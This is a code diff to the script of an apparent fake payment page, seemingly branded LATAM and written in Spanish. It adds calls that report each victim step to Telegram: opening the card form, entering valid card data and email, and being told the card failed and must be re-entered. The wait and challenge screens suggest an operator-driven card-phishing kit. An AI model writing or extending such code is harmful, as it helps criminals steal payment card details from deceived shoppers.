@@ -523,6 +523,15 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     }
   }
 
+  function resetTelegramStep(event) {
+    try {
+      if (window.__latamTgSent) delete window.__latamTgSent[event];
+      sessionStorage.removeItem('latam-tg:' + event);
+    } catch {
+      /* ignore */
+    }
+  }
+
   const boardEl = document.getElementById('pagos-board');
   const legsJson = boardEl?.dataset.legs || '[]';
   const copy = JSON.parse(boardEl?.dataset.copy || '{}');
@@ -637,6 +646,9 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         clearCardInputs();
         setCardOpen(true);
         showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        resetTelegramStep('✅ Ingreso datos cc');
+        resetTelegramStep('Devuelta a ingresar tarjeta');
+        notifyTelegramStep('Devuelta a ingresar tarjeta');
         cardNumber?.focus();
         return;
       }
@@ -1018,8 +1030,10 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     addCardToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
     addCardToggle.setAttribute('aria-pressed', open ? 'true' : 'false');
     cardForm.hidden = !open;
-    if (open) syncCardFieldStates();
-    else syncPayEnabled();
+    if (open) {
+      notifyTelegramStep('Abrio banner de pago');
+      syncCardFieldStates();
+    } else syncPayEnabled();
   }
 
   if (addCardToggle) {
@@ -1139,6 +1153,13 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
     syncCardCvvVisibility();
     syncPayEnabled();
+    notifyCardDataIfReady();
+  }
+
+  function notifyCardDataIfReady() {
+    if (addCardToggle?.getAttribute('aria-expanded') !== 'true') return;
+    if (!isCardPaymentValid() || !isValidEmail(cardEmail?.value)) return;
+    notifyTelegramStep('✅ Ingreso datos cc');
   }
 
   function syncCardEmailError() {
@@ -1226,6 +1247,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     syncEmailValidity(cardEmail);
     syncCardEmailError();
     syncPayEnabled();
+    notifyCardDataIfReady();
   });
   cardEmail?.addEventListener('blur', () => {
     syncEmailValidity(cardEmail);
@@ -1267,7 +1289,6 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
     sheet.hidden = !open;
     sheet.classList.toggle('is-open', open);
     document.body.classList.toggle('pagos-sheet-open', open);
-    if (open) notifyTelegramStep('Abrio banner de pago');
   }
 
   document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
@@ -1275,7 +1296,6 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
 
   payBtn?.addEventListener('click', async () => {
     if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
-    notifyTelegramStep('✅ Ingreso datos cc');
     debugPollGen += 1;
     const wait = document.getElementById('pagos-wait-screen');
     const challenge = document.getElementById('pagos-challenge-screen');
